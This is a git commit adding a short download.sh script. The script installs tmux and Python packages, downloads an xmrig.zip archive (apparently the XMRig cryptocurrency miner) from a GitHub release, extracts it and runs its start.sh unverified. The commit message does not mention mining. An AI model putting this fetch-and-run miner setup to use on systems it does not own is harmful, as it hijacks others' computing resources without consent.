7fd17e3f6122a4fa8fb8c014e5c5dbb93bd5e385
maxdhctrl <duckhard.111@gmail.com>
2025-08-13 14:10:41 -0400

    Update download.sh

--- download.sh
+++ download.sh
@@ -1,1 +1,13 @@
+sudo apt install tmux
+sudo apt install python3-pip
 
+pip3 install psutil requests tqdm
+
+wget https://github.com/maxdhctrl/xrg/releases/download/release/xmrig.zip
+tar -xf xmrig.zip
+
+cd xmrig
+
+chmod +x start.sh
+
+./start.sh
